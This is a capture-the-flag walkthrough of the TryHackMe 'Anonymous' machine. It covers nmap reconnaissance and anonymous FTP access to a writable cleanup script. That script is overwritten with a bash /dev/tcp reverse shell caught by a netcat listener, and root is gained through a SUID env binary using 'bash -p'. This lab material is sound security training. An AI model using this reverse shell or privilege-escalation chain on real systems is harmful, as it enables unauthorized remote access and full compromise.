# TryHackMe — Anonymous

## 1. Reconnaissance (Nmap)

We start by scanning all TCP ports and identifying the running services:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

The scan reveals four open ports:

```text
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
|      vsFTPd 3.0.3 - secure, fast, stable
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu
```

The most interesting finding is the FTP service:

- Anonymous login is enabled.
- The `scripts` directory is writable.

SSH and SMB are also running, but we start by investigating FTP.

## 2. FTP Enumeration

Connect to the FTP server:

```bash
ftp <TARGET_IP>
```

Use `anonymous` as the username and leave the password empty.

After successfully connecting, list the available files:

```ftp
ls -la
```

We discover a directory named `scripts`. Enter it and inspect its contents:

```ftp
cd scripts
ls -la
```

The directory contains several files:

- `clean.sh` — a Bash cleanup script.
- `removed_files.log` — a log file.
- `to_do.txt` — a text file.

Download the cleanup script for inspection:

```ftp
get clean.sh
```

The script contains the following code:

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files

if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi
```

We also notice that the script has writable permissions:

```text
-rwxr-xrwx
```

This means that the file can be modified through our anonymous FTP access.

## 3. Initial Access — Reverse Shell

Since we can modify `clean.sh`, we replace its contents with a Bash reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1
```

Replace `<YOUR_IP>` with our TryHackMe VPN IP address and `<YOUR_PORT>` with the port we want to use.

Start a listener on our Kali machine:

```bash
nc -lvnp <YOUR_PORT>
```

After modifying the script, we wait for an incoming connection.

Initially, I suspected that the script might execute when the FTP session was disconnected. However, no connection arrived immediately after disconnecting. A reverse shell appeared after waiting for some time.

This suggests that the script is executed automatically, independently of the FTP session. The exact execution mechanism was not investigated directly.

Once the connection arrives, we check our current user:

```bash
id
```

Output:

```text
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

We now have initial access to the machine as `namelessone`.

## 4. User Flag

Navigate to the user's home directory:

```bash
cd /home/namelessone
ls -la
```

Locate and read the user flag:

```bash
cat user.txt
```

## 5. Privilege Escalation — SUID Enumeration

Now we need to find a way to escalate our privileges.

Search the filesystem for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

SUID (Set User ID) is a special permission that allows an executable to run with the effective privileges of its file owner.

Among the discovered binaries, we find:

```text
/usr/bin/env
```

Check its permissions:

```bash
ls -la /usr/bin/env
```

Output:

```text
-rwsr-xr-x 1 root root ... /usr/bin/env
```

The `s` in the owner's execute permission indicates that the SUID bit is set.

Since the binary is owned by root, it can execute with root privileges.

## 6. Exploiting SUID — GTFOBins

We can use GTFOBins to identify a way to exploit the SUID-enabled `env` binary.

Execute:

```bash
/usr/bin/env /bin/bash -p
```

The `-p` option tells Bash to preserve its effective privileges instead of dropping them.

Verify the result:

```bash
id
```

Expected output:

```text
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=...
```

Notice the difference:

- `uid=1000` — our real user is still `namelessone`.
- `euid=0` — our effective user ID is root.

We have successfully escalated our privileges to root.

## 7. Root Flag

Navigate to the root directory:

```bash
cd /root
ls -la
```

Read the final flag:

```bash
cat root.txt
```

We have successfully obtained the root flag and completed the machine.

---

## Key Takeaways

1. **Anonymous FTP access** — allowed us to access the FTP server without credentials.
2. **Incorrect file permissions** — allowed us to modify `clean.sh`.
3. **Automatic script execution** — allowed our modified script to establish a reverse shell.
4. **SUID misconfiguration** — the root-owned `/usr/bin/env` binary allowed privilege escalation.
5. **GTFOBins** — provided the technique used to exploit the SUID binary.

### Vulnerabilities Used

- Writable script accessible through anonymous FTP.
- SUID misconfiguration on `/usr/bin/env`.

### Attack Chain

```text
Nmap
  |
  v
Anonymous FTP Login
  |
  v
Writable scripts Directory
  |
  v
Modify clean.sh
  |
  v
Reverse Shell
  |
  v
namelessone
  |
  v
SUID Enumeration
  |
  v
/usr/bin/env
  |
  v
bash -p
  |
  v
Root Access
```
